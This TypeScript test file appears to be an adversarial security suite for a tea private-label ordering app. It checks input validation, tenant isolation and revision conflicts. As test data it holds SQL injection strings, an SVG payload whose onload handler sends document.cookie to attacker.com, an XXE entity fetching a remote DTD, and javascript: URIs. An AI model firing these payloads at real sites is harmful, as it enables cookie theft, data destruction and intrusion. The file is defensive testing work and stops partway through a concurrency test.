import { prepareProofForApproval } from "./private-label-proof-fixture";
/**
 * TeaFloww Private Label Studio — Tier 5 White-Box Adversarial Stress Test Suite
 * File: tests/unit/private-label-tier5-routes-mcp-adversarial.test.ts
 *
 * Scope:
 * 1. Malformed payloads, SQL injection attempt patterns, SVG script tag injection into design metadata
 * 2. Anti-enumeration across all API routes (verifying 404 on unowned resources without leaking existence)
 * 3. Stale CAS revision updates across REST APIs and MCP tools
 * 4. Release gate bypass attempts (trying to force release without deposit or proof)
 * 5. Whitelisted public DTO projections and sensitive data redaction audit
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import path from "node:path";
import { rmSync } from "node:fs";
import type Database from "better-sqlite3";
import { getDb } from "@/lib/db";
import { PrivateLabelService } from "@/lib/private-label/service";
import { dispatchToolCall, McpError } from "@/lib/mcp";
import type { AuditActor } from "@/lib/private-label/types";

// Route Handlers
import { GET as getCatalogueRoute } from "@/app/api/v1/private-label/catalogue/route";
import { GET as getPackagingDetailRoute } from "@/app/api/v1/private-label/packaging/[slug]/route";
import {
  GET as getProjectsRoute,
  POST as createProjectRoute,
} from "@/app/api/v1/private-label/projects/route";
import {
  GET as getProjectRoute,
  PATCH as patchProjectRoute,
  PUT as putProjectRoute,
} from "@/app/api/v1/private-label/projects/[id]/route";
import { GET as getCurrentProofRoute } from "@/app/api/v1/private-label/projects/[id]/proofs/current/route";
import {
  GET as listDesignVersionsRoute,
  POST as createDesignVersionRoute,
} from "@/app/api/v1/private-label/projects/[id]/design-versions/route";
import { PATCH as patchArtworkRoute } from "@/app/api/v1/private-label/projects/[id]/artwork/route";
import { GET as getQuoteRoute } from "@/app/api/v1/private-label/quotes/[id]/route";
import { GET as getQuotePdfRoute } from "@/app/api/v1/private-label/quotes/[id]/pdf/route";
import { POST as approveProofRoute } from "@/app/api/v1/private-label/proofs/[id]/approve/route";
import { POST as rejectProofRoute } from "@/app/api/v1/private-label/proofs/[id]/reject/route";
import { GET as getOrderRoute } from "@/app/api/v1/private-label/orders/[id]/route";
import { POST as checkoutOrderRoute } from "@/app/api/v1/private-label/orders/checkout/route";
import { POST as validatePreflightRoute } from "@/app/api/v1/private-label/preflight/validate/route";
import { POST as releaseJobAdminRoute } from "@/app/api/v1/admin/private-label/jobs/route";

// ----------------------------------------------------------------------------
// Test Configuration & Isolated Database
// ----------------------------------------------------------------------------
const TEST_DB_PATH = path.join(
  tmpdir(),
  `pl-tier5-routes-mcp-${process.pid}-${Date.now()}.sqlite`
);
process.env.DATABASE_PATH = TEST_DB_PATH;
(process.env as Record<string, string | undefined>).NODE_ENV = "test";
const TEST_ADMIN_TOKEN = "tier5_adversarial_admin_secret_token_123456";
process.env.ADMIN_TEST_TOKEN = TEST_ADMIN_TOKEN;

// Generic MCP dispatch helpers
function callMcp<T = unknown>(name: string, args?: unknown): T {
  return dispatchToolCall(name, args ?? {}) as T;
}

function failsMcpWith(name: string, args: unknown): McpError {
  try {
    dispatchToolCall(name, args);
  } catch (error) {
    expect(error).toBeInstanceOf(McpError);
    return error as McpError;
  }
  throw new Error(`Expected tool "${name}" to fail with McpError`);
}

describe("Tier 5 Adversarial White-Box Coverage: Routes, Storefront, Prepress Canvas & MCP", () => {
  let db: Database.Database;

  // Tenant Identifiers
  const TENANT_A_CUST = "cust_alpha_tier5";
  const TENANT_A_CLIENT = "client_alpha_tier5";
  const TENANT_B_CUST = "cust_beta_tier5";
  const TENANT_B_CLIENT = "client_beta_tier5";

  // Seeded Entity References
  let tenantAProjectId: string;
  let tenantAProjectItemId: string;
  let tenantAQuoteId: string;
  let tenantADesignVersionId: string;
  let tenantAOrderId: string;

  const ADMIN_HEADERS = {
    "Content-Type": "application/json",
    "x-admin-test-token": TEST_ADMIN_TOKEN,
  };

  const ACTOR_TENANT_A: AuditActor = {
    actor_type: "customer",
    actor_id: TENANT_A_CUST,
    actor_email: "alpha@teafloww.com",
    ip_address: "127.0.0.1",
  };

  beforeAll(() => {
    // 1. Run migrations synchronously on clean isolated DB
    execFileSync(process.execPath, ["scripts/migrate.mjs"], {
      cwd: process.cwd(),
      env: { ...process.env, DATABASE_PATH: TEST_DB_PATH },
      stdio: "ignore",
    });

    db = getDb();
    db.pragma("foreign_keys = ON");

    // 2. Seed initial catalog
    PrivateLabelService.seedInitialCatalog();

    // Seed primary packaging variant
    db.prepare(`
      INSERT OR IGNORE INTO pl_packaging_variants (
        id, family_id, slug, sku, title, material, finish, closure_type,
        capacity_description, net_weight_capacity_grams, width_mm, height_mm, depth_mm,
        label_safe_width_mm, label_safe_height_mm, supplier_name, supplier_sku,
        unit_cost_paise, lead_time_days, moq_units, order_multiple, status, revision
      ) VALUES (
        'pack_pouch_standup_250g_01', 'fam_pouch', 'stand-up-pouch-matte-black-250g', 'PK-POUCH-250-MB',
        'Stand-Up Pouch Matte Black 250g', 'Kraft/Foil', 'Matte', 'Zipper',
        '250g / 8.8oz', 250, 160, 230, 80,
        140, 150, 'Siliguri Pack Corp', 'SPC-MB-250',
        2500, 14, 500, 50, 'published', 1
      )
    `).run();

    // Seed primary tea option
    db.prepare(`
      INSERT OR IGNORE INTO pl_tea_options (
        id, slug, name, origin_estate, region, grade, flush, tea_category,
        description, caffeine_level, base_cost_per_kg_paise, min_batch_kg,
        tasting_notes_json, is_published, sample_available, revision
      ) VALUES (
        'tea_darjeeling_first_flush', 'darjeeling-first-flush-organic', 'Darjeeling First Flush Organic',
        'Makaibari Estate', 'Darjeeling', 'FTGFOP1', 'First Flush 2026', 'black',
        'Floral muscatel profile with orchid notes', 'medium', 120000, 5.0,
        '["Orchid", "Muscatel", "Fresh Hay"]', 1, 1, 1
      )
    `).run();

    // Seed print compatibility
    db.prepare(`
      INSERT OR IGNORE INTO pl_packaging_compatibility (id, packaging_variant_id, print_method_id, is_supported)
      VALUES ('compat_pouch_paper_label', 'pack_pouch_standup_250g_01', 'pm_paper_label', 1)
    `).run();

    // Seed active price book tiers
    db.prepare(`
      INSERT OR IGNORE INTO pl_price_book_tiers (id, price_book_id, item_type, item_id, min_qty, max_qty, unit_price_paise)
      VALUES ('pbt_pack_test', 'pb_default_inr', 'packaging', 'pack_pouch_standup_250g_01', 100, 10000, 3500),
             ('pbt_print_test', 'pb_default_inr', 'print_method', 'pm_paper_label', 100, 10000, 1500),
             ('pbt_tea_test', 'pb_default_inr', 'tea_markup', 'tea_darjeeling_first_flush', 1, 10000, 150000)
    `).run();

    // 3. Seed two tenants (Alpha = Owner, Beta = Adversary)
    db.prepare(`
      INSERT OR IGNORE INTO customers (id, email, name)
      VALUES 
        (?, 'alpha@teafloww.com', 'Alpha Merchant'),
        (?, 'beta@teafloww.com', 'Beta Adversary')
    `).run(TENANT_A_CUST, TENANT_B_CUST);

    db.prepare(`
      INSERT OR IGNORE INTO pl_clients (id, customer_id, company_name, contact_name, contact_email)
      VALUES
        (?, ?, 'Alpha Teas Ltd', 'Alice Alpha', 'alpha@teafloww.com'),
        (?, ?, 'Beta Infiltrators Inc', 'Bob Beta', 'beta@teafloww.com')
    `).run(TENANT_A_CLIENT, TENANT_A_CUST, TENANT_B_CLIENT, TENANT_B_CUST);

    // 4. Provision full resource pipeline for Tenant A
    // 4.1 Project
    const project = PrivateLabelService.createProjectDraft(
      {
        title: "Alpha Sovereign Reserve",
        target_market: "IN",
        brand_name: "Alpha Organic",
        initialConfig: { primaryCategory: "pouch" },
      },
      TENANT_A_CUST,
      ACTOR_TENANT_A
    );
    tenantAProjectId = project.id;

    // Fetch catalogue defaults for items
    const teas = PrivateLabelService.listTeaOptions();
    const packs = PrivateLabelService.listPackaging();
    const prints = PrivateLabelService.listPrintMethods();
    const teaId = teas.items[0]?.id;
    const packId = packs.items[0]?.id;
    const printId = prints[0]?.id;

    // 4.2 Project Item
    tenantAProjectItemId = `pi_alpha_${Date.now()}`;
    db.prepare(`
      INSERT INTO pl_project_items (id, project_id, tea_option_id, packaging_variant_id, print_method_id, fill_weight_grams, quantity_units, color_count)
      VALUES (?, ?, ?, ?, ?, 100, 1000, 2)
    `).run(tenantAProjectItemId, tenantAProjectId, teaId, packId, printId);

    // 4.3 Design Version / Proof
    const dv = PrivateLabelService.createDesignVersion(
      tenantAProjectId,
      {
        project_item_id: tenantAProjectItemId,
        expected_revision: 1,
        scene_json: { front: { text: "Alpha Signature" } },
        asset_url: "https://assets.teafloww.com/proofs/alpha-v1.png",
      },
      ACTOR_TENANT_A,
      TENANT_A_CUST
    );
    tenantADesignVersionId = dv.id;

    // 4.4 Quote
    const quote = PrivateLabelService.createQuote(
      tenantAProjectId,
      { validity_days: 30 },
      ACTOR_TENANT_A,
      TENANT_A_CUST
    );
    tenantAQuoteId = quote.id;

    // 4.5 Production Order
    const { order } = PrivateLabelService.convertQuoteToOrder(
      tenantAQuoteId,
      {
        shipping_address: {
          line1: "123 Alpha Way",
          city: "Siliguri",
          state: "West Bengal",
          postal_code: "734001",
          country: "India",
        },
      },
      TENANT_A_CUST,
      ACTOR_TENANT_A
    );
    tenantAOrderId = order.id;
  });

  afterAll(() => {
    try {
      rmSync(TEST_DB_PATH, { force: true });
    } catch {
      // Ignore cleanup error
    }
  });

  // ==========================================================================
  // SUITE 1: Injection Attacks, Malformed Payloads & Preflight Security
  // ==========================================================================
  describe("Suite 1: Injection Attacks, Malformed Payloads & Prepress Security", () => {
    it("1.1 Malformed JSON payload strings return 400 Bad Request across REST routes", async () => {
      const routesToTest = [
        {
          name: "POST /projects",
          fn: () =>
            createProjectRoute(
              new Request("http://localhost/api/v1/private-label/projects", {
                method: "POST",
                headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
                body: "INVALID_JSON_NOT_AN_OBJECT{{{",
              })
            ),
        },
        {
          name: "PATCH /projects/[id]",
          fn: () =>
            patchProjectRoute(
              new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}`, {
                method: "PATCH",
                headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
                body: "{ broken json...",
              }),
              { params: Promise.resolve({ id: tenantAProjectId }) }
            ),
        },
        {
          name: "POST /proofs/[id]/approve",
          fn: () =>
            approveProofRoute(
              new Request(`http://localhost/api/v1/private-label/proofs/${tenantADesignVersionId}/approve`, {
                method: "POST",
                headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
                body: "MALFORMED_APPROVE_BODY",
              }),
              { params: Promise.resolve({ id: tenantADesignVersionId }) }
            ),
        },
        {
          name: "POST /preflight/validate",
          fn: () =>
            validatePreflightRoute(
              new Request("http://localhost/api/v1/private-label/preflight/validate", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: "MALFORMED_PREFLIGHT_RAW",
              })
            ),
        },
        {
          name: "POST /orders/checkout",
          fn: () =>
            checkoutOrderRoute(
              new Request("http://localhost/api/v1/private-label/orders/checkout", {
                method: "POST",
                headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
                body: "MALFORMED_CHECKOUT_RAW",
              })
            ),
        },
      ];

      for (const route of routesToTest) {
        const res = await route.fn();
        expect(res.status, `Expected 400 on ${route.name}`).toBe(400);
        const data = await res.json();
        expect(data).toHaveProperty("error");
      }
    });

    it("1.2 Non-object payloads (array, string, number) fail schema validation gracefully with 400", async () => {
      const resArray = await createProjectRoute(
        new Request("http://localhost/api/v1/private-label/projects", {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
          body: JSON.stringify(["item1", "item2", 123]),
        })
      );
      expect(resArray.status).toBe(400);

      const resNumber = await createProjectRoute(
        new Request("http://localhost/api/v1/private-label/projects", {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
          body: JSON.stringify(123456),
        })
      );
      expect(resNumber.status).toBe(400);
    });

    it("1.3 SQL injection patterns in route path parameters are neutralized via parameterization", async () => {
      const sqlInjectionIds = [
        "proj_' OR '1'='1",
        "'; DROP TABLE pl_projects; --",
        "proj_1' UNION SELECT * FROM customers --",
        "1; WAITFOR DELAY '0:0:5'--",
      ];

      for (const sqlId of sqlInjectionIds) {
        // Test project inspect route
        const resProj = await getProjectRoute(
          new Request(`http://localhost/api/v1/private-label/projects/${encodeURIComponent(sqlId)}`, {
            method: "GET",
            headers: { "x-customer-id": TENANT_A_CUST },
          }),
          { params: Promise.resolve({ id: sqlId }) }
        );
        expect(resProj.status).toBe(404);

        // Test quote inspect route
        const resQuote = await getQuoteRoute(
          new Request(`http://localhost/api/v1/private-label/quotes/${encodeURIComponent(sqlId)}`, {
            method: "GET",
            headers: { "x-customer-id": TENANT_A_CUST },
          }),
          { params: Promise.resolve({ id: sqlId }) }
        );
        expect(resQuote.status).toBe(404);

        // Test order inspect route
        const resOrder = await getOrderRoute(
          new Request(`http://localhost/api/v1/private-label/orders/${encodeURIComponent(sqlId)}`, {
            method: "GET",
            headers: { "x-customer-id": TENANT_A_CUST },
          }),
          { params: Promise.resolve({ id: sqlId }) }
        );
        expect(resOrder.status).toBe(404);
      }

      // Assert table was not dropped
      const count = db.prepare("SELECT count(*) as cnt FROM pl_projects").get() as { cnt: number };
      expect(count.cnt).toBeGreaterThan(0);
    });

    it("1.4 SQL injection attempts in query search parameters are safely handled without leakage", async () => {
      const res = await getCatalogueRoute(
        new Request("http://localhost/api/v1/private-label/catalogue?category=tin' OR 1=1--&search=' UNION SELECT 1,2,3--")
      );
      // Either valid filtered response or 400 validation error, but NEVER 500 SQL syntax crash
      expect([200, 400]).toContain(res.status);
      if (res.status === 200) {
        const data = await res.json();
        expect(Array.isArray(data.packaging_variants)).toBe(true);
      }
    });

    it("1.5 SQL injection payload strings in mutation bodies are stored verbatim without execution", async () => {
      const maliciousTitle = "Normal Brand'; DROP TABLE pl_clients; --";
      const res = await createProjectRoute(
        new Request("http://localhost/api/v1/private-label/projects", {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
          body: JSON.stringify({
            title: maliciousTitle,
            targetMarket: "IN",
          }),
        })
      );
      expect(res.status).toBe(201);
      const data = await res.json();
      expect(data.project.title).toBe(maliciousTitle);

      // Verify pl_clients table still exists and is untouched
      const clients = db.prepare("SELECT count(*) as c FROM pl_clients").get() as { c: number };
      expect(clients.c).toBeGreaterThanOrEqual(2);
    });

    it("1.6 Prepress Preflight rejects SVG with embedded <script> tags", async () => {
      const xssSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
          <circle cx="50" cy="50" r="40" fill="red" />
          <script type="text/javascript">
            alert('XSS_ATTACK');
          </script>
        </svg>
      `;

      const res = await validatePreflightRoute(
        new Request("http://localhost/api/v1/private-label/preflight/validate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            mime_type: "image/svg+xml",
            svg_content: xssSvg,
            file_size_bytes: Buffer.byteLength(xssSvg),
          }),
        })
      );

      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.valid).toBe(false);
      expect(data.status).toBe("rejected");
      expect(data.prohibited_scripts_detected).toBe(true);
      expect(data.errors.some((e: string) => /script/i.test(e))).toBe(true);
    });

    it("1.7 Preflight rejects SVG with inline JavaScript event handlers (e.g. onload, onmouseover)", async () => {
      const eventHandlerSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com?cookie='+document.cookie)">
          <rect width="100" height="100" fill="blue" onmouseover="alert('Hover')" />
        </svg>
      `;

      const res = await validatePreflightRoute(
        new Request("http://localhost/api/v1/private-label/preflight/validate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            mime_type: "image/svg+xml",
            svg_content: eventHandlerSvg,
            file_size_bytes: Buffer.byteLength(eventHandlerSvg),
          }),
        })
      );

      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.valid).toBe(false);
      expect(data.prohibited_scripts_detected).toBe(true);
      expect(data.errors.some((e: string) => /event handler/i.test(e))).toBe(true);
    });

    it("1.8 Preflight rejects XML External Entity (XXE) injection attacks", async () => {
      const xxeSvg = `<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [
          <!ENTITY % xxe SYSTEM "http://malicious-host.com/xxe.dtd">
          %xxe;
        ]>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
          <text>&xxe;</text>
        </svg>
      `;

      const res = await validatePreflightRoute(
        new Request("http://localhost/api/v1/private-label/preflight/validate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            mime_type: "image/svg+xml",
            svg_content: xxeSvg,
            file_size_bytes: Buffer.byteLength(xxeSvg),
          }),
        })
      );

      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.valid).toBe(false);
      expect(data.prohibited_scripts_detected).toBe(true);
      expect(data.errors.some((e: string) => /XXE|External Entity/i.test(e))).toBe(true);
    });

    it("1.9 Preflight rejects SVG containing <foreignObject> tags", async () => {
      const foreignObjectSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
          <foreignObject width="100" height="100">
            <body xmlns="http://www.w3.org/1999/xhtml">
              <iframe src="javascript:alert(1)"></iframe>
            </body>
          </foreignObject>
        </svg>
      `;

      const res = await validatePreflightRoute(
        new Request("http://localhost/api/v1/private-label/preflight/validate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            mime_type: "image/svg+xml",
            svg_content: foreignObjectSvg,
            file_size_bytes: Buffer.byteLength(foreignObjectSvg),
          }),
        })
      );

      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.valid).toBe(false);
      expect(data.prohibited_scripts_detected).toBe(true);
      expect(data.errors.some((e: string) => /foreignObject/i.test(e))).toBe(true);
    });

    it("1.10 Preflight rejects SVG containing javascript: URI hyperlinks", async () => {
      const jsUriSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
          <a href="javascript:alert('pwned')">
            <circle cx="50" cy="50" r="40" fill="green" />
          </a>
        </svg>
      `;

      const res = await validatePreflightRoute(
        new Request("http://localhost/api/v1/private-label/preflight/validate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            mime_type: "image/svg+xml",
            svg_content: jsUriSvg,
            file_size_bytes: Buffer.byteLength(jsUriSvg),
          }),
        })
      );

      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.valid).toBe(false);
      expect(data.prohibited_scripts_detected).toBe(true);
      expect(data.errors.some((e: string) => /javascript:\s*URI/i.test(e))).toBe(true);
    });

    it("1.11 Preflight detects payload magic byte mismatch (e.g. executable disguised as PNG)", async () => {
      // Create executable bash script disguised as image/png
      const fakePngBuffer = Buffer.from("#!/bin/bash\necho 'MALICIOUS SCRIPT'\n", "utf-8");

      const res = await validatePreflightRoute(
        new Request("http://localhost/api/v1/private-label/preflight/validate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            mime_type: "image/png",
            file_data: fakePngBuffer.toString("base64"),
            file_size_bytes: fakePngBuffer.length,
            filename: "exploit.png",
          }),
        })
      );

      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.valid).toBe(false);
      expect(data.errors.some((e: string) => /magic bytes/i.test(e))).toBe(true);
    });

    it("1.12 MCP Tool protocol boundaries: invalid tool name throws -32601", () => {
      const err = failsMcpWith("private_label_nonexistent_exploit_tool", {});
      expect(err.code).toBe(-32601);
    });

    it("1.13 MCP Tool parameter fuzzing: negative expected_revision throws -32602", () => {
      const err = failsMcpWith("private_label_save_project", {
        id: tenantAProjectId,
        expected_revision: -1,
      });
      expect(err.code).toBe(-32602);
    });
  });

  // ==========================================================================
  // SUITE 2: Strict Multi-Tenant Anti-Enumeration (404 on Unowned Resources)
  // ==========================================================================
  describe("Suite 2: Multi-Tenant Anti-Enumeration & Resource Isolation", () => {
    it("2.1 GET /projects/[id] as unowned tenant returns 404 (identical to non-existent ID)", async () => {
      // Tenant B queries Tenant A's project
      const resCross = await getProjectRoute(
        new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}`, {
          method: "GET",
          headers: { "x-customer-id": TENANT_B_CUST },
        }),
        { params: Promise.resolve({ id: tenantAProjectId }) }
      );

      // Query non-existent project
      const resNonExistent = await getProjectRoute(
        new Request("http://localhost/api/v1/private-label/projects/proj_fake_999999", {
          method: "GET",
          headers: { "x-customer-id": TENANT_B_CUST },
        }),
        { params: Promise.resolve({ id: "proj_fake_999999" }) }
      );

      expect(resCross.status).toBe(404);
      expect(resNonExistent.status).toBe(404);

      const jsonCross = await resCross.json();
      const jsonNonExistent = await resNonExistent.json();
      expect(jsonCross).toEqual(jsonNonExistent);
      expect(jsonCross.error).toBe("Project not found");
    });

    it("2.1b GET /projects as Tenant B lists zero of Tenant A's projects", async () => {
      const res = await getProjectsRoute(
        new Request("http://localhost/api/v1/private-label/projects", {
          method: "GET",
          headers: { "x-customer-id": TENANT_B_CUST },
        })
      );
      expect(res.status).toBe(200);
      const data = await res.json();
      expect(data.projects.some((p: { id: string }) => p.id === tenantAProjectId)).toBe(false);
    });

    it("2.2 PATCH and PUT /projects/[id] as unowned tenant returns 404 and blocks mutation", async () => {
      const resCross = await patchProjectRoute(
        new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_B_CUST },
          body: JSON.stringify({
            title: "Hijacked by Beta",
            expected_revision: 1,
          }),
        }),
        { params: Promise.resolve({ id: tenantAProjectId }) }
      );

      const resPutCross = await putProjectRoute(
        new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_B_CUST },
          body: JSON.stringify({
            title: "Hijacked via PUT by Beta",
            expected_revision: 1,
          }),
        }),
        { params: Promise.resolve({ id: tenantAProjectId }) }
      );

      expect(resCross.status).toBe(404);
      expect(resPutCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Project not found");

      // Verify original title was not modified in DB
      const original = db
        .prepare("SELECT title FROM pl_projects WHERE id = ?")
        .get(tenantAProjectId) as { title: string };
      expect(original.title).toBe("Alpha Sovereign Reserve");
    });

    it("2.3 GET /projects/[id]/proofs/current as unowned tenant returns 404", async () => {
      const resCross = await getCurrentProofRoute(
        new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}/proofs/current`, {
          method: "GET",
          headers: { "x-customer-id": TENANT_B_CUST },
        }),
        { params: Promise.resolve({ id: tenantAProjectId }) }
      );

      expect(resCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Project not found");
    });

    it("2.4 GET /projects/[id]/design-versions as unowned tenant returns 404", async () => {
      const resCross = await listDesignVersionsRoute(
        new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}/design-versions`, {
          method: "GET",
          headers: { "x-customer-id": TENANT_B_CUST },
        }),
        { params: Promise.resolve({ id: tenantAProjectId }) }
      );

      expect(resCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Project not found");
    });

    it("2.5 PATCH /projects/[id]/artwork as unowned tenant returns 404", async () => {
      const resCross = await patchArtworkRoute(
        new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}/artwork`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_B_CUST },
          body: JSON.stringify({
            artwork_url: "https://evil.com/malicious.png",
            expected_revision: 1,
          }),
        }),
        { params: Promise.resolve({ id: tenantAProjectId }) }
      );

      expect(resCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Project not found");
    });

    it("2.6 POST /projects/[id]/design-versions as unowned tenant returns 404", async () => {
      const resCross = await createDesignVersionRoute(
        new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}/design-versions`, {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_B_CUST },
          body: JSON.stringify({
            project_item_id: tenantAProjectItemId,
            scene_json: { injected: true },
            expected_revision: 1,
          }),
        }),
        { params: Promise.resolve({ id: tenantAProjectId }) }
      );

      expect(resCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Project not found");
    });

    it("2.7 GET /quotes/[id] as unowned tenant returns 404 without leaking quotation values", async () => {
      const resCross = await getQuoteRoute(
        new Request(`http://localhost/api/v1/private-label/quotes/${tenantAQuoteId}`, {
          method: "GET",
          headers: { "x-customer-id": TENANT_B_CUST },
        }),
        { params: Promise.resolve({ id: tenantAQuoteId }) }
      );

      expect(resCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Quote not found");
      expect(json).not.toHaveProperty("quote");
      expect(json).not.toHaveProperty("total_paise");
    });

    it("2.8 GET /quotes/[id]/pdf as unowned tenant returns 404 without rendering PDF document", async () => {
      const resCross = await getQuotePdfRoute(
        new Request(`http://localhost/api/v1/private-label/quotes/${tenantAQuoteId}/pdf`, {
          method: "GET",
          headers: { "x-customer-id": TENANT_B_CUST },
        }),
        { params: Promise.resolve({ id: tenantAQuoteId }) }
      );

      expect(resCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Quote not found");
    });

    it("2.9 POST /proofs/[id]/approve as unowned tenant returns 404 and blocks sign-off", async () => {
      const resCross = await approveProofRoute(
        new Request(`http://localhost/api/v1/private-label/proofs/${tenantADesignVersionId}/approve`, {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_B_CUST },
          body: JSON.stringify({
            disclaimer_accepted: true,
            signer_name: "Adversary Bob",
          }),
        }),
        { params: Promise.resolve({ id: tenantADesignVersionId }) }
      );

      expect(resCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Proof not found");

      // Verify proof remains unlocked
      const dv = db
        .prepare("SELECT is_locked FROM pl_design_versions WHERE id = ?")
        .get(tenantADesignVersionId) as { is_locked: number };
      expect(dv.is_locked).toBe(0);
    });

    it("2.10 POST /proofs/[id]/reject as unowned tenant returns 404 and blocks rejection", async () => {
      const resCross = await rejectProofRoute(
        new Request(`http://localhost/api/v1/private-label/proofs/${tenantADesignVersionId}/reject`, {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_B_CUST },
          body: JSON.stringify({
            reason: "Malicious rework request",
          }),
        }),
        { params: Promise.resolve({ id: tenantADesignVersionId }) }
      );

      expect(resCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Proof not found");
    });

    it("2.11 GET /orders/[id] as unowned tenant returns 404 without leaking manufacturing details", async () => {
      const resCross = await getOrderRoute(
        new Request(`http://localhost/api/v1/private-label/orders/${tenantAOrderId}`, {
          method: "GET",
          headers: { "x-customer-id": TENANT_B_CUST },
        }),
        { params: Promise.resolve({ id: tenantAOrderId }) }
      );

      expect(resCross.status).toBe(404);
      const json = await resCross.json();
      expect(json.error).toBe("Order not found");
      expect(json).not.toHaveProperty("order_number");
      expect(json).not.toHaveProperty("deposit_paise");
    });

    it("2.12 MCP multi-tenant isolation: tools throw -32004 when accessing unowned project or quote", () => {
      // Tenant B tries to get Tenant A's project
      const errProj = failsMcpWith("private_label_get_project", {
        id: tenantAProjectId,
        client_id: TENANT_B_CLIENT,
      });
      expect(errProj.code).toBe(-32004);

      // Tenant B tries to get Tenant A's quote
      const errQuote = failsMcpWith("private_label_get_quote", {
        id: tenantAQuoteId,
        client_id: TENANT_B_CLIENT,
      });
      expect(errQuote.code).toBe(-32004);

      // Tenant B tries to approve Tenant A's proof
      const errProof = failsMcpWith("private_label_approve_proof", {
        id: tenantADesignVersionId,
        client_id: TENANT_B_CLIENT,
        disclaimer_accepted: true,
      });
      expect(errProof.code).toBe(-32004);
    });
  });

  // ==========================================================================
  // SUITE 3: Stale CAS Concurrency Collisions across REST & MCP
  // ==========================================================================
  describe("Suite 3: Stale CAS Concurrency Collisions across REST APIs & MCP Tools", () => {
    it("3.1 REST PATCH /projects/[id] with stale revision returns 409 Conflict with revision metadata", async () => {
      // Fetch current revision
      const proj = db
        .prepare("SELECT revision FROM pl_projects WHERE id = ?")
        .get(tenantAProjectId) as { revision: number };
      const staleRevision = proj.revision - 1; // 0 or stale

      const res = await patchProjectRoute(
        new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
          body: JSON.stringify({
            title: "Updated Title",
            expected_revision: staleRevision,
          }),
        }),
        { params: Promise.resolve({ id: tenantAProjectId }) }
      );

      expect(res.status).toBe(409);
      const json = await res.json();
      expect(json).toHaveProperty("error");
      expect(json.current_revision).toBe(proj.revision);
      expect(json.expected_revision).toBe(staleRevision);
    });

    it("3.2 Parallel update race on project draft: exactly one succeeds, the other receives 409 Conflict", async () => {
      const proj = db
        .prepare("SELECT revision FROM pl_projects WHERE id = ?")
        .get(tenantAProjectId) as { revision: number };
      const currentRev = proj.revision;

      // Two concurrent updates both expecting currentRev
      const [res1, res2] = await Promise.all([
        patchProjectRoute(
          new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}`, {
            method: "PATCH",
            headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
            body: JSON.stringify({
              title: "Race Update 1",
              expected_revision: currentRev,
            }),
          }),
          { params: Promise.resolve({ id: tenantAProjectId }) }
        ),
        patchProjectRoute(
          new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}`, {
            method: "PATCH",
            headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
            body: JSON.stringify({
              title: "Race Update 2",
              expected_revision: currentRev,
            }),
          }),
          { params: Promise.resolve({ id: tenantAProjectId }) }
        ),
      ]);

